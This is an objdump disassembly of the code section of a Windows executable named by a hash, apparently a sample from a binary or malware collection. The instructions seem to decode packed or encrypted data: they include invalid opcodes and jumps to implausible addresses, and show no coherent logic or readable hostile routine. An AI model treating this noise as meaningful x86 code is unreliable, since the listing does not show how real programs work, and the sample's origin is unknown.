
a4415d2b36e5d29b1aa7ace7681e20da00a80cd98ce93277f8cada101008dcc1.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	add    al,BYTE PTR [esi]
  411002:	inc    eax
  411003:	les    edx,FWORD PTR [eax+0x70808c90]
  411009:	add    al,0x0
  41100b:	and    DWORD PTR [ecx],edx
  41100d:	or     al,BYTE PTR [eax]
  41100f:	add    al,0x82
  411011:	es and al,0xd0
  411014:	add    al,BYTE PTR [ecx]
  411016:	adc    BYTE PTR [ecx-0x37],al
  411019:	dec    ebp
  41101a:	inc    esp
  41101b:	jb     0x14111b1
  411021:	add    BYTE PTR [eax],ch
  411023:	inc    eax
  411024:	ret    0x30
  411027:	test   DWORD PTR [esi-0xfff7fd8],edx
  41102d:	popa   
  41102e:	sbb    al,0x26
  411030:	or     BYTE PTR [edx+eax*1+0x6005021b],al
  411037:	and    ah,BYTE PTR [eax]
  411039:	add    al,0x80
  41103b:	and    BYTE PTR [eax+ecx*1],al
  41103e:	add    BYTE PTR [ecx],al
  411040:	or     eax,DWORD PTR [eax+0x0]
  411043:	and    BYTE PTR [edi],0x10
  411046:	add    DWORD PTR [edx+0x54],eax
  411049:	or     DWORD PTR [eax+0x5da18],eax
  41104f:	and    BYTE PTR [edx],dl
  411051:	iret   
  411052:	inc    edx
  411053:	inc    esp
  411054:	or     al,0x5e
  411056:	adc    al,BYTE PTR [esp+ecx*4]
  411059:	test   eax,edx
  41105b:	mov    cl,0x20
  41105d:	cmp    BYTE PTR [esi],al
  41105f:	and    al,0x80
  411061:	lods   al,BYTE PTR ds:[esi]
  411062:	adc    BYTE PTR [ecx],al
  411064:	add    DWORD PTR [edx-0x7ffa4700],edx
  41106a:	xchg   ecx,eax
  41106b:	sbb    dl,BYTE PTR [edx]
  41106d:	push   edx
  41106e:	jbe    0x411070
  411070:	add    eax,DWORD PTR [eax+ebx*1-0x3fdedc00]
  411077:	or     dl,BYTE PTR [eax]
  411079:	inc    edx
  41107a:	sub    BYTE PTR [edx],0xb9
  41107d:	xchg   esi,eax
  41107e:	add    ch,dh
  411080:	sub    BYTE PTR [eax+0x15],al
  411083:	(bad)  
  411084:	shl    BYTE PTR [edx],1
  411086:	test   al,0x32
  411088:	and    al,BYTE PTR [ebp+0x1cc84109]
  41108e:	or     ch,BYTE PTR gs:[edx]
  411091:	add    BYTE PTR [eax+eax*1+0x49],ch
  411095:	xor    BYTE PTR [edx-0x579ded80],bl
  41109b:	jp     0x4110dd
  41109d:	mov    DWORD PTR [ecx],eax
  41109f:	add    dl,dl
  4110a1:	test   BYTE PTR [ecx],al
  4110a3:	inc    eax
  4110a4:	add    BYTE PTR [ecx+0x44810060],bl
  4110aa:	adc    DWORD PTR [eax+0x4c1be404],eax
  4110b0:	pop    edx
  4110b1:	or     al,0x88
  4110b3:	push   ebx
  4110b4:	mov    BYTE PTR [ecx],al
  4110b6:	add    al,0xa0
  4110b8:	and    al,0x9
  4110ba:	add    BYTE PTR [eax-0x80],bl
  4110bd:	dec    ebp
  4110be:	adc    dl,BYTE PTR [eax+0x2604802c]
  4110c4:	xor    eax,0x3708042
  4110c9:	add    DWORD PTR [ecx*1+0x50802202],eax
  4110d0:	nop
  4110d1:	add    esi,DWORD PTR [esi]
  4110d3:	nop
  4110d4:	dec    eax
  4110d5:	adc    al,0x6
  4110d7:	loopne 0x4110ea
  4110d9:	adc    al,BYTE PTR [edx]
  4110db:	or     BYTE PTR [eax],cl
  4110dd:	inc    eax
  4110de:	xor    DWORD PTR [ebx],eax
  4110e0:	push   0x21
  4110e2:	inc    ecx
  4110e3:	or     BYTE PTR [ecx-0x40],0xc0
  4110e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110e8:	fsub   DWORD PTR [eax+0x1c08452]
  4110ee:	sbb    DWORD PTR [ecx],edx
  4110f0:	add    BYTE PTR [ecx+edx*4],al
  4110f3:	add    BYTE PTR [edx+edx*1],al
  4110f6:	ret    
  4110f7:	add    al,al
  4110f9:	rcl    BYTE PTR [eax],0x48
  4110fc:	and    BYTE PTR [eax],dl
  4110fe:	add    DWORD PTR [eax],edx
  411100:	add    BYTE PTR [edx+0x0],al
  411103:	add    BYTE PTR [eax],al
  411105:	cmp    eax,0x40016300
  41110a:	add    DWORD PTR [eax],eax
  41110c:	sbb    BYTE PTR [eax],0x80
  41110f:	add    BYTE PTR [ebx+edx*2],dl
  411112:	push   eax
  411113:	or     al,0xa8
  411115:	inc    edx
  411116:	push   eax
  411117:	inc    ecx
  411118:	add    al,BYTE PTR [edx+eax*4-0x77d37d6d]
  41111f:	rol    BYTE PTR [eax],0x20
  411122:	add    BYTE PTR [eax+0x20],cl
  411125:	and    al,0x10
  411127:	add    BYTE PTR [eax+0x6841258],ah
  41112d:	and    ebp,DWORD PTR ds:0x884d01a0
  411133:	or     BYTE PTR [eax],al
  411135:	and    BYTE PTR [edx+eax*4],dl
  411138:	add    BYTE PTR [eax+0x4],al
  41113b:	xor    BYTE PTR [ebp+0x44c011c4],dl
  411141:	xor    BYTE PTR [ecx-0x7d],dl
  411144:	loope  0x411148
  411146:	mov    DWORD PTR [eax],ecx
  411148:	inc    eax
  411149:	and    BYTE PTR [ebp+0x62],0x40
  41114d:	mov    bl,0x0
  41114f:	mov    ecx,0x210205
  411154:	push   es
  411155:	xor    BYTE PTR [eax+0x8028388],cl
  41115b:	add    BYTE PTR [eax],ah
  41115d:	xchg   edx,eax
  41115e:	fs dec eax
  411160:	mov    ah,BYTE PTR [eax]
  411162:	and    al,0x0
  411164:	mov    cl,0x40
  411166:	or     al,0x0
  411168:	shl    al,0x0
  41116b:	shl    BYTE PTR es:[edi+0x24c3c04c],0x60
  411173:	mov    al,ds:0x42008218
  411178:	adc    BYTE PTR [ecx+eax*4+0x0],dl
  41117c:	add    DWORD PTR [eax+0x0],eax
  41117f:	add    BYTE PTR [esi],dl
  411181:	sub    BYTE PTR [edx],al
  411183:	rcr    DWORD PTR [edx-0x60],0x0
  411187:	add    cl,BYTE PTR [ecx]
  411189:	sub    cl,BYTE PTR [eax]
  41118b:	and    BYTE PTR [eax],0x4
  41118e:	pusha  
  41118f:	add    BYTE PTR [ecx+eax*8],ah
  411192:	adc    al,0x8
  411194:	add    DWORD PTR [eax+ecx*2],edx
  411197:	add    DWORD PTR [edx+0x10120004],ecx
  41119d:	ret    
  41119e:	sbb    dl,BYTE PTR [eax+0x201cd048]
  4111a4:	mov    eax,ds:0x10200004
  4111a9:	add    al,al
  4111ab:	or     DWORD PTR [edx],eax
  4111ad:	mov    BYTE PTR [eax],cl
  4111af:	or     BYTE PTR [ecx],0xd8
  4111b2:	test   cl,al
  4111b4:	push   es
  4111b5:	test   DWORD PTR [ecx],eax
  4111b7:	ins    BYTE PTR es:[edi],dx
  4111b8:	or     bh,BYTE PTR [edx]
  4111ba:	add    BYTE PTR [edx+0xa],al
  4111bd:	and    DWORD PTR [eax-0x76],ecx
  4111c0:	adc    DWORD PTR [eax],eax
  4111c2:	sbb    al,ch
  4111c4:	fmul   DWORD PTR [eax+0x2d44]
  4111ca:	push   ebp
  4111cb:	add    edx,DWORD PTR [eax]
  4111cd:	xor    BYTE PTR [eax],bl
  4111cf:	inc    ecx
  4111d0:	adc    BYTE PTR [eax+0x30],al
  4111d3:	and    BYTE PTR [esi],0x52
  4111d6:	or     al,0x78
  4111d8:	rcl    BYTE PTR [eax],0x8
  4111db:	sub    DWORD PTR [ecx],ecx
  4111dd:	add    DWORD PTR [edi],0x12
  4111e0:	adc    DWORD PTR [eax+0x42],eax
  4111e3:	pusha  
  4111e4:	add    ecx,DWORD PTR [ecx+0x2]
  4111e7:	test   BYTE PTR [edx+0x40041388],al
  4111ed:	and    al,BYTE PTR [ecx]
  4111ef:	loop   0x411205
  4111f1:	xor    al,BYTE PTR [eax]
  4111f3:	inc    esi
  4111f4:	and    BYTE PTR [eax],bl
  4111f6:	inc    eax
  4111f7:	inc    eax
  4111f8:	retf   0x604
  4111fb:	loopne 0x4111fe
  4111fd:	and    BYTE PTR [edx],dl
  4111ff:	inc    eax
  411200:	add    eax,0xa8830050
  411205:	mov    cl,BYTE PTR [eax-0x76]
  411208:	add    eax,0x7c000
  41120d:	and    BYTE PTR [edx-0x80],al
  411210:	push   ss
  411211:	dec    esp
  411212:	add    BYTE PTR [ecx+0x38100606],al
  411218:	add    BYTE PTR [ecx],dl
  41121a:	add    DWORD PTR [edx+0x2a11822],eax
  411220:	add    DWORD PTR [edx],edx
  411222:	and    al,0x16
  411224:	xchg   BYTE PTR [edx-0x6dff7ffc],al
  41122a:	pushf  
  41122b:	xor    al,0x34
  41122d:	adc    eax,0x41460a18
  411232:	add    BYTE PTR [eax-0x5fe9dfe4],al
  411238:	and    BYTE PTR [eax],cl
  41123a:	add    BYTE PTR [edx-0x37f77fe0],dl
  411240:	xor    BYTE PTR [edx+edx*1+0x1821213],al
  411247:	or     BYTE PTR [ecx],al
  411249:	add    BYTE PTR [esi],cl
  41124b:	add    al,BYTE PTR [eax]
  41124d:	mov    WORD PTR [ebx],ds
  41124f:	dec    eax
  411250:	dec    eax
  411251:	and    al,ah
  411253:	add    BYTE PTR [eax+ecx*1],0x40
  411257:	and    BYTE PTR [ecx+0x2c003100],dl
  41125d:	mov    ds,WORD PTR [eax]
  41125f:	mov    ds:0x20805b82,al
  411264:	add    cl,BYTE PTR [edx]
  411266:	add    DWORD PTR [eax+0x0],0x81040a0
  41126d:	add    BYTE PTR [eax+eax*4+0x501150],cl
  411274:	add    BYTE PTR [ecx+ecx*1+0x7],al
  411278:	and    al,0x43
  41127a:	adc    esi,DWORD PTR [edi+0x8]
  41127d:	xchg   edx,eax
  41127e:	or     BYTE PTR [eax+ecx*1],al
  411281:	add    BYTE PTR [ecx],al
  411283:	inc    eax
  411284:	and    ah,BYTE PTR [eax]
  411286:	inc    edx
  411287:	adc    BYTE PTR [eax+eax*1],cl
  41128a:	add    dl,BYTE PTR [esp+eax*1]
  41128d:	add    BYTE PTR [ecx],al
  41128f:	xchg   edx,eax
  411290:	xor    BYTE PTR [eax+edx*1+0x10],al
  411294:	imul   eax,DWORD PTR [eax-0x68],0x24004458
  41129b:	dec    ecx
  41129c:	adc    al,BYTE PTR [edx]
  41129e:	and    BYTE PTR [eax+0x61],al
  4112a1:	push   cs
  4112a2:	xchg   BYTE PTR [ecx],bh
  4112a4:	and    al,0x80
  4112a6:	mov    eax,cs
  4112a8:	sbb    al,BYTE PTR ds:0x40100900
  4112ae:	or     eax,0x200034a0
  4112b3:	pop    eax
  4112b4:	pusha  
  4112b5:	inc    eax
  4112b6:	mov    es,WORD PTR [ecx+0x74]
  4112b9:	ret    0x8361
  4112bc:	inc    eax
  4112bd:	mov    al,ds:0x5613070
  4112c2:	add    BYTE PTR [ebx],0x7
  4112c5:	test   eax,0x458758c2
  4112ca:	dec    eax
  4112cb:	adc    DWORD PTR [eax],eax
  4112cd:	jp     0x411341
  4112cf:	inc    ecx
  4112d0:	or     BYTE PTR es:[ebx],al
  4112d3:	add    ah,BYTE PTR [edx]
  4112d5:	leave  
  4112d6:	and    DWORD PTR [eax],0x10
  4112d9:	push   ss
  4112da:	inc    ebp
  4112db:	adc    BYTE PTR [ecx+0x20],al
  4112de:	and    al,BYTE PTR [eax]
  4112e0:	into   
  4112e1:	or     al,BYTE PTR [edx+ecx*1]
  4112e4:	push   esp
  4112e5:	push   0x1002062
  4112ea:	and    esp,DWORD PTR [eax+eax*1]
  4112ed:	add    DWORD PTR [eax+0x46020805],eax
  4112f3:	and    DWORD PTR [ecx+0xc50e0b2],ebp
  4112f9:	adc    BYTE PTR [eax-0x577fdffe],ah
  4112ff:	add    al,0x49
  411302:	inc    ecx
  411303:	mov    eax,ds:0xcdc3d020
  411308:	add    DWORD PTR [edx],edx
  41130a:	dec    edx
  41130b:	add    ah,BYTE PTR [eax]
  41130d:	pusha  
  41130e:	cmp    BYTE PTR [eax+0x8124c90],al
  411314:	mov    al,ds:0x14219414
  411319:	add    eax,0x9023225
  41131e:	popa   
  41131f:	cs adc al,0x42
  411322:	sbb    edi,DWORD PTR [eax+0x1]
  411325:	add    al,0x43
  411327:	inc    edx
  411328:	add    BYTE PTR [eax],0x4
  41132b:	sbb    al,ah
  41132d:	or     al,0xa7
  41132f:	adc    BYTE PTR [ecx],dl
  411331:	add    DWORD PTR [eax],ebp
  411333:	add    BYTE PTR [ecx+0x410440],al
  411339:	add    al,BYTE PTR [eax]
  41133b:	inc    eax
  41133c:	adc    DWORD PTR [edx+ecx*1+0x40],esp
  411340:	add    bl,BYTE PTR [ecx]
  411342:	loopne 0x4112e8
  411344:	add    BYTE PTR [eax+eiz*1],dh
  411347:	sub    cl,BYTE PTR [eax+eax*1+0x2890913]
  41134e:	cmp    BYTE PTR [ecx+eiz*8+0xc],dh
  411352:	adc    BYTE PTR [eax],ah
  411354:	adc    eax,0x84510020
  411359:	and    BYTE PTR [eax],al
  41135b:	add    DWORD PTR [eax],esp
  41135d:	nop
  41135e:	mov    al,ds:0x22a16571
  411363:	sbb    ah,BYTE PTR [ecx]
  411365:	push   es
  411366:	adc    BYTE PTR [ebp+0x8],al
  411369:	mov    ds:0x11a38065,eax
  41136e:	inc    eax
  41136f:	add    BYTE PTR [eax],al
  411371:	sub    BYTE PTR [ecx],dl
  411373:	sbb    BYTE PTR [edx+0x28141c0],al
  411379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41137a:	add    BYTE PTR [ecx],ah
  41137c:	add    al,0xa
  41137e:	add    BYTE PTR [eax+eax*4+0x1a808244],al
  411385:	and    BYTE PTR [eax],al
  411387:	and    eax,0x41040
  41138c:	add    BYTE PTR [ecx],al
  41138e:	xor    BYTE PTR [eax],al
  411390:	adc    DWORD PTR [edx],eax
  411392:	add    al,0xa2
  411394:	cwde   
  411395:	cs push edx
  411397:	add    eax,DWORD PTR [ecx+eax*4]
  41139a:	or     BYTE PTR [ebp+0x8],0x52
  41139e:	pusha  
  41139f:	loopne 0x411321
  4113a1:	sbb    BYTE PTR [esi+0xd051810],ah
  4113a7:	add    BYTE PTR [eax],al
  4113a9:	xchg   BYTE PTR [ecx],dl
  4113ab:	inc    eax
  4113ac:	and    DWORD PTR [esi],eax
  4113ae:	adc    BYTE PTR [edx],ah
  4113b0:	add    DWORD PTR [ecx],eax
  4113b2:	add    BYTE PTR [eax],al
  4113b4:	inc    ecx
  4113b5:	add    dl,BYTE PTR [ecx]
  4113b7:	and    eax,0x38000404
  4113bc:	or     eax,DWORD PTR [eax]
  4113be:	inc    eax
  4113bf:	add    BYTE PTR [edx],0x40
  4113c2:	loopne 0x411345
  4113c4:	test   BYTE PTR [ecx],cl
  4113c6:	pusha  
  4113c7:	add    BYTE PTR ds:0x7c4a2c94,al
  4113cd:	or     DWORD PTR [ebx],eax
  4113cf:	or     BYTE PTR [eax+0x1230aa44],al
  4113d5:	adc    BYTE PTR [eax],dl
  4113d7:	or     al,BYTE PTR [ecx]
  4113d9:	sub    BYTE PTR [eax],ah
  4113db:	xor    eax,0x48600800
  4113e0:	cmp    DWORD PTR [ebx+0x2284c058],eax
  4113e6:	or     BYTE PTR [eax],ch
  4113e8:	inc    ecx
  4113e9:	add    BYTE PTR [eax],dl
  4113eb:	mov    BYTE PTR [edx+ebx*8],ch
  4113ee:	xor    BYTE PTR [eax+0x33],al
  4113f1:	adc    BYTE PTR [eax+edx*4-0x67f7ffbf],ah
  4113f8:	add    BYTE PTR [edx+0x8100cdd],0x0
  4113ff:	ret    0x4419
  411402:	dec    ecx
  411403:	inc    eax
  411404:	inc    eax
  411405:	and    eax,DWORD PTR [eax+0x63248063]
  41140b:	mov    al,0x20
  41140d:	adc    BYTE PTR [eax],ah
  41140f:	add    DWORD PTR [edx+0x20081a84],edx
  411415:	or     dh,BYTE PTR [ebx+0x31080475]
  41141b:	loopne 0x411442
  41141d:	inc    eax
  41141e:	add    DWORD PTR [ecx],0x88810e00
  411424:	push   es
  411425:	add    eax,DWORD PTR [esi+0x56]
  411428:	xor    al,0x0
  41142a:	mov    eax,ds:0x30300008
  41142f:	push   eax
  411430:	cmp    al,0x22
  411432:	or     BYTE PTR [edx+eiz*1+0x31000800],al
  411439:	and    BYTE PTR [eax],cl
  41143b:	or     al,0x60
  41143d:	or     DWORD PTR [eax+eax*4+0x628202],eax
  411444:	or     DWORD PTR [eax+0x19],eax
  411447:	mov    ch,al
  411449:	or     BYTE PTR [edx+ebp*2],bl
  41144c:	bound  eax,QWORD PTR [eax]
  41144e:	and    DWORD PTR [eax+0x51],eax
  411451:	mov    al,ds:0x6c4e0901
  411456:	and    BYTE PTR [edx-0x5f6f7f64],dh
  41145c:	add    BYTE PTR [eax+0x830a00a],al
  411462:	or     DWORD PTR [eax+0x20],edx
  411465:	xchg   ecx,eax
  411466:	add    DWORD PTR [eax],esp
  411468:	jl     0x411490
  41146a:	loop   0x41148d
  41146c:	inc    eax
  41146d:	into   
  41146e:	sbb    BYTE PTR [eax],0x3
  411471:	dec    edx
  411472:	adc    BYTE PTR [ecx],al
  411474:	inc    ebx
  411475:	sbb    al,0xa5
  411477:	aad    0x42
  411479:	pop    eax
  41147a:	leave  
  41147b:	mov    ds:0x43296904,eax
  411480:	enter  0x2400,0x32
  411484:	inc    eax
  411485:	add    BYTE PTR [esi-0x4f],0x0
  411489:	mov    WORD PTR [eax+ecx*2],?
  41148c:	and    dl,BYTE PTR [eax]
  41148e:	adc    al,0xc
  411490:	and    DWORD PTR [edx+0xc2d8040],esi
  411496:	inc    edx
  411497:	add    BYTE PTR [eax+0x3022800],ah
  41149d:	add    BYTE PTR [edx],al
  41149f:	and    BYTE PTR [ecx-0x79],al
  4114a2:	push   ss
  4114a3:	or     dh,BYTE PTR [eax]
  4114a5:	and    DWORD PTR [eax+0x41],eax
  4114a8:	xor    DWORD PTR [eax+eax*2],eax
  4114ab:	add    al,0x20
  4114ad:	or     BYTE PTR [eax+0x19883110],al
  4114b3:	or     eax,0x7104421
  4114b8:	add    DWORD PTR [eax+0x18401c0],ebp
  4114be:	push   eax
  4114bf:	xor    DWORD PTR [edx],0x9c0a0410
  4114c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114c6:	add    al,BYTE PTR [eax]
  4114c8:	or     BYTE PTR [eax],al
  4114ca:	and    BYTE PTR [ecx],al
  4114cc:	inc    ecx
  4114cd:	sub    eax,eax
  4114cf:	inc    ebp
  4114d0:	add    dh,BYTE PTR [eax+0x18]
  4114d3:	test   al,0x41
  4114d5:	add    esp,eax
  4114d7:	add    al,0x10
  4114d9:	xchg   edx,eax
  4114da:	in     eax,0x40
  4114dc:	xchg   esp,eax
  4114dd:	add    BYTE PTR [eax-0x58],al
  4114e0:	inc    esi
  4114e1:	adc    BYTE PTR [eax-0x6f59b3f4],ah
  4114e7:	or     al,0x3d
  4114e9:	adc    ah,BYTE PTR [edx]
  4114eb:	test   BYTE PTR [edx+ebp*4+0x40],cl
  4114ef:	adc    al,BYTE PTR [eax]
  4114f1:	add    BYTE PTR [eax],al
  4114f3:	add    BYTE PTR [eax],0x20
  4114f6:	add    BYTE PTR [esp+eax*2-0x78],al
  4114fa:	add    BYTE PTR [ecx+0x39010824],al
  411500:	or     BYTE PTR ds:0x4100d12c,cl
  411506:	scas   eax,DWORD PTR es:[edi]
  411507:	and    eax,0x510200
  41150c:	add    eax,0x284100
  411511:	or     edx,edx
  411513:	pusha  
  411514:	or     DWORD PTR [eax],0x412c0802
  41151a:	xchg   esp,eax
  41151b:	add    DWORD PTR [edx+ecx*2],esp
  41151e:	sbb    al,0x21
  411520:	add    al,0xa2
  411522:	mov    esp,ss
  411524:	add    ah,BYTE PTR [edx+eax*1]
  411527:	add    al,BYTE PTR [edx+0x4]
  41152a:	or     BYTE PTR [edx],al
  41152c:	sbb    al,BYTE PTR [esi]
  41152e:	test   eax,0x8c02cc42
  411533:	add    al,BYTE PTR [eax-0x78]
  411536:	or     BYTE PTR [edx+eax*1-0x7fedfff6],0x5c
  41153e:	mov    al,ds:0x90608824
  411543:	push   ss
  411544:	inc    eax
  411545:	adc    eax,0xc8164000
  41154a:	sub    BYTE PTR [edx],cl
  41154c:	leave  
  41154d:	or     al,dh
  41154f:	xor    DWORD PTR [eax+eax*8],esi
  411552:	test   cl,ah
  411554:	loopne 0x4115d2
  411556:	and    DWORD PTR [eax],ebx
  411558:	and    BYTE PTR [eax+eax*4],cl
  41155b:	xor    eax,0x40015165
  411560:	inc    ebp
  411561:	mov    al,BYTE PTR [edx+0x4007500c]
  411567:	add    eax,DWORD PTR [eax]
  411569:	pusha  
  41156a:	add    BYTE PTR [ecx+eax*2],al
  41156d:	rol    BYTE PTR [eax+0x8884440],0x18
  411574:	add    BYTE PTR [eax],al
  411576:	inc    eax
  411577:	cmp    al,BYTE PTR [ecx+0x40]
  41157a:	inc    esp
  41157b:	xchg   esi,eax
  41157c:	add    BYTE PTR [eax],0x28
  41157f:	test   BYTE PTR [eax],al
  411581:	sub    BYTE PTR [ecx+0x55],dl
  411584:	fsub   DWORD PTR [eax]
  411586:	sbb    BYTE PTR ds:0xd90002,cl
  41158c:	add    BYTE PTR [eax+0x4],dl
  41158f:	sub    eax,0x10609010
  411594:	test   BYTE PTR [ecx*8-0x7be3b800],ah
  41159b:	or     BYTE PTR [edx+0x0],al
  41159e:	inc    eax
  41159f:	pusha  
  4115a0:	mov    eax,ds:0x9101509
  4115a5:	inc    esp
  4115a6:	pusha  
  4115a7:	xor    eax,DWORD PTR [edx+0x21]
  4115aa:	and    BYTE PTR [eax+eax*2],0x88
  4115ae:	or     BYTE PTR [ebx],0xb6
  4115b1:	and    ah,BYTE PTR [esp+edx*1]
  4115b4:	mov    al,ds:0xe2948048
  4115b9:	or     BYTE PTR [eax],al
  4115bb:	inc    eax
  4115bc:	mov    BYTE PTR [eax-0x60],cl
  4115bf:	and    cl,BYTE PTR [eax]
  4115c1:	int    0xfa
  4115c3:	and    al,0x9c
  4115c5:	cdq    
  4115c6:	and    al,0x2a
  4115c8:	adc    DWORD PTR [eax],eax
  4115ca:	mov    edx,0x4401a289
  4115cf:	push   0xd0642218
  4115d4:	test   BYTE PTR [edx-0x60],cl
  4115d7:	add    BYTE PTR [eax],ah
  4115d9:	mov    BYTE PTR [edx+0x4],al
  4115dc:	test   BYTE PTR [edi],al
  4115de:	add    al,BYTE PTR [eax-0x7d]
  4115e1:	sbb    BYTE PTR [eax],0x40
  4115e4:	inc    esp
  4115e5:	inc    ebp
  4115e6:	adc    eax,0x128a0a01
  4115eb:	sbb    DWORD PTR [eax+0x1b],ebx
  4115ee:	or     BYTE PTR [eax+0x24100251],al
  4115f4:	dec    esp
  4115f5:	shl    BYTE PTR [ecx],0x73
  4115f8:	rcr    BYTE PTR [ecx+0x41],0xa0
  4115fc:	(bad)  
  4115fd:	push   ss
  4115fe:	add    ah,BYTE PTR [eax+0x10]
  411601:	add    BYTE PTR [eax],bl
  411603:	mov    al,ds:0x490211a8
  411608:	inc    ecx
  411609:	add    BYTE PTR [esp+ecx*1],ah
  41160c:	pop    es
  41160d:	push   ss
  41160e:	add    BYTE PTR [edx+eax*1+0x44010015],dh
  411615:	xor    DWORD PTR [ebp+eiz*1+0x2],edx
  411619:	add    BYTE PTR [esi],cl
  41161b:	inc    ecx
  41161c:	add    DWORD PTR [edx+0x0],edx
  41161f:	add    al,al
  411621:	inc    ecx
  411622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411623:	or     BYTE PTR [eax-0x68],0x34
  411627:	adc    DWORD PTR [eax],0x0
  41162a:	lea    eax,[eax+0x21]
  41162d:	mov    esi,DWORD PTR [edx]
  41162f:	push   es
  411630:	inc    esp
  411631:	test   BYTE PTR [ecx+eiz*4],0x1
  411635:	xor    DWORD PTR [eax+0x118c028],ecx
  41163b:	inc    ecx
  41163c:	inc    ebp
  41163d:	add    eax,0x1448040
  411642:	add    BYTE PTR [edx-0x72],al
  411645:	or     BYTE PTR ds:0x101800c4,0xa9
  41164c:	add    BYTE PTR gs:[edi],ah
  41164f:	ret    0x140
  411652:	rol    DWORD PTR [ecx+0x49b5108],0x48
  411659:	dec    esi
  41165a:	or     eax,DWORD PTR [eax+ebp*2]
  41165d:	add    BYTE PTR [ebx+0x410c590],al
  411663:	inc    eax
  411664:	mov    ecx,0xd0082ce0
  411669:	push   ss
  41166a:	add    al,BYTE PTR [edx]
  41166c:	test   BYTE PTR [eax],ah
  41166e:	adc    ah,al
  411670:	adc    al,0xe4
  411672:	add    DWORD PTR [eax-0x7775fdf7],eax
  411678:	add    BYTE PTR [ebp+0xa],cl
  41167b:	nop
  41167c:	adc    BYTE PTR [esi],0x0
  41167f:	add    eax,DWORD PTR [ecx]
  411681:	add    BYTE PTR [ebp+eax*1+0x2202801],al
  411688:	push   0x89b02cc4
  41168d:	add    DWORD PTR [ebx+ecx*1],0x1
  411691:	or     BYTE PTR [edx+0x55],0x47
  411695:	push   ecx
  411696:	rol    BYTE PTR [esi],1
  411698:	adc    BYTE PTR [ebx],al
  41169a:	rol    BYTE PTR [esi+0x8],0x48
  41169e:	xchg   ebp,eax
  41169f:	dec    ebp
  4116a0:	adc    al,0x82
  4116a2:	or     BYTE PTR [eax+edx*1+0x5a50101f],dl
  4116a9:	or     al,ah
  4116ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116ac:	and    ch,BYTE PTR [eax]
  4116ae:	adc    eax,DWORD PTR [eax+eax*2]
  4116b1:	sbb    bl,ch
  4116b3:	inc    ebx
  4116b4:	sbb    edx,DWORD PTR [ecx+0x40909023]
  4116ba:	sbb    BYTE PTR [eax],0x0
  4116bd:	dec    ecx
  4116be:	mov    al,BYTE PTR [eax+0x44]
  4116c1:	jb     0x411647
  4116c3:	fs push cs
  4116c5:	adc    eax,0x6084338
  4116ca:	adc    BYTE PTR [eax],al
  4116cc:	add    BYTE PTR [eax],al
  4116ce:	push   edx
  4116cf:	shr    DWORD PTR [eax],0x20
  4116d2:	mov    al,ds:0x4081004
  4116d7:	inc    eax
  4116d8:	or     eax,0x10006502
  4116dd:	and    al,BYTE PTR ds:0x103c9a80
  4116e3:	adc    DWORD PTR [esp+eax*2],eax
  4116e6:	add    DWORD PTR [eax],0x8082c860
  4116ec:	mov    BYTE PTR [eax],cl
  4116ee:	and    BYTE PTR ds:0x88113010,bl
  4116f4:	or     BYTE PTR [ecx-0x38],ch
  4116f7:	sbb    eax,0x6d2602e2
  4116fc:	xor    BYTE PTR [ebx],dl
  4116fe:	add    BYTE PTR [eax],al
  411700:	mov    al,ds:0x40066a50
  411705:	adc    BYTE PTR [ecx],0x40
  411708:	mov    DWORD PTR [ebx+0x2000108],eax
  41170e:	and    BYTE PTR [eax+eiz*1],al
  411711:	sbb    eax,0xc8243181
  411716:	loopne 0x41175a
  411718:	nop
  411719:	inc    esp
  41171a:	and    DWORD PTR [eax],edx
  41171c:	or     dl,BYTE PTR [eax+0xc801032]
  411722:	sub    DWORD PTR [eax],esp
  411724:	inc    ecx
  411725:	push   es
  411726:	add    BYTE PTR [edx],cl
  411728:	add    DWORD PTR ds:0x40000888,ecx
  41172e:	inc    esp
  41172f:	push   es
  411730:	je     0x411782
  411732:	nop
  411733:	inc    eax
  411734:	adc    al,0x1
  411736:	inc    edx
  411737:	add    DWORD PTR [eax],ebx
  411739:	mov    al,ds:0x52208063
  41173e:	test   BYTE PTR [eax+ebx*4+0x60],al
  411742:	loopne 0x41177b
  411744:	and    DWORD PTR [ebx],eax
  411746:	add    BYTE PTR [ecx],0x8
  411749:	and    ch,BYTE PTR [edx]
  41174b:	add    DWORD PTR [eax],ecx
  41174d:	add    DWORD PTR [ecx],eax
  41174f:	add    BYTE PTR [eax+0x20b001],al
  411755:	inc    edx
  411756:	inc    ecx
  411757:	inc    edx
  411758:	inc    ecx
  411759:	and    esp,DWORD PTR [eax+ebx*1]
  41175c:	add    al,BYTE PTR [ecx]
  41175e:	add    BYTE PTR [eax],cl
  411760:	enter  0x4,0x2
  411764:	popa   
  411765:	adc    al,0x14
  411767:	dec    eax
  411768:	add    eax,DWORD PTR [esi+eax*8-0x6fffffb5]
  41176f:	add    DWORD PTR [eax],edi
  411771:	or     al,al
  411773:	sbb    al,0x32
  411775:	add    eax,0xa00808
  41177a:	mov    al,ds:0x40086
  41177f:	sbb    eax,eax
  411781:	inc    ecx
  411782:	xor    DWORD PTR [ebx-0x7b],edx
  411785:	nop
  411786:	or     ah,al
  411788:	inc    eax
  411789:	sbb    al,BYTE PTR [edx+0x1]
  41178c:	fs out 0x11,al
  41178f:	and    al,BYTE PTR [eax+eax*4]
  411792:	add    BYTE PTR [eax+eax*2],ah
  411795:	and    BYTE PTR [edx+0x1a],0x32
  411799:	and    BYTE PTR [ecx],ah
  41179b:	dec    ecx
  41179c:	add    BYTE PTR [ecx],al
  41179e:	add    al,0x9c
  4117a0:	add    al,0x4
  4117a2:	add    BYTE PTR [ebp+0x1060a08],al
  4117a8:	xchg   ebp,eax
  4117a9:	add    DWORD PTR [ebx+0x45],eax
  4117ac:	sub    BYTE PTR [edx+0x8517230],dl
  4117b2:	or     DWORD PTR [eax],ebx
  4117b4:	adc    BYTE PTR [ebp-0x6a5bea50],ah
  4117ba:	add    ecx,DWORD PTR [edx]
  4117bc:	leave  
  4117bd:	or     al,0x15
  4117bf:	or     cl,dl
  4117c1:	adc    BYTE PTR ds:0x94510180,dl
  4117c7:	bound  eax,QWORD PTR [eax+0x10028248]
  4117cd:	adc    BYTE PTR [ebp-0x3fea009e],al
  4117d3:	pop    edx
  4117d4:	inc    ebx
  4117d5:	add    BYTE PTR [eax],al
  4117d7:	adc    BYTE PTR [eax-0x757ddff8],0x11
